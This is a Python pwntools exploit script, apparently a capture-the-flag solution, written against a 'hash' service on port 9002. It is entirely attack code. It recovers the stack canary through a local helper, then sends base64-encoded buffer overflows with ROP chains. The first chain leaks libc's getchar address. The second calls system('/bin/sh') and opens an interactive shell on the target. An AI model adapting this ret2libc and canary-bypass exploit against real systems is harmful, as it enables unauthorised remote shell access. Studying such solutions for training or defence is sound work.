#!/usr/bin/env python
#the script should be run on the server side

import pwn, struct
from base64 import b64encode

def int2uint(data):
	return struct.unpack('<I', struct.pack('<i', data))[0]

'''
first round
'''
io = pwn.remote('localhost', 9002)

io.recvuntil('Are you human? input captcha : ')
captcha = io.recvline()
io.send(captcha)

# calculate canary
canaryio = pwn.process('./canary')
canaryio.sendline(captcha)
canary = int(canaryio.recvline())
canary = int2uint(canary) # turn signed int to unsigned int
canaryio.close()

elf = pwn.ELF('./hash')
libc = pwn.ELF('/lib/i386-linux-gnu/libc.so.6')

# leak libc address
ropgadget = ''.join(map(pwn.p32, [elf.plt['puts'], elf.sym['main'], elf.got['getchar']]))
payload = 'A' * 512 + pwn.p32(canary) + 'A' * 8 + pwn.p32(elf.sym['g_buf']) + ropgadget
payload = b64encode(payload)
io.recvuntil('Encode your data with BASE64 then paste me!')
io.sendline(payload)
io.recvuntil('MD5(data) : ')
io.recvline()

# calculate system and find '/bin/sh'
libc_getchar = pwn.u32(io.recv(4))
base = libc_getchar - libc.sym['getchar']
libc_system = base + libc.sym['system']
addr_shell = base + next(libc.search('/bin/sh'))

'''
second round
'''
io.recvuntil('Are you human? input captcha : ')
captcha = io.recvline()
io.send(captcha)

# calculate canary
canaryio = pwn.process('./canary')
canaryio.sendline(captcha)
canary = int(canaryio.recvline())
canary = int2uint(canary) # turn signed int to unsigned int
canaryio.close()

ropgadget = ''.join(map(pwn.p32, [libc_system, elf.sym['main'], addr_shell]))
payload = 'A' * 512 + pwn.p32(canary) + 'A' * 8 + pwn.p32(elf.sym['g_buf']) + ropgadget
payload = b64encode(payload)

io.recvuntil('Encode your data with BASE64 then paste me!')
io.sendline(payload)
io.recvuntil('MD5(data) : ')
io.recvline()

io.interactive()
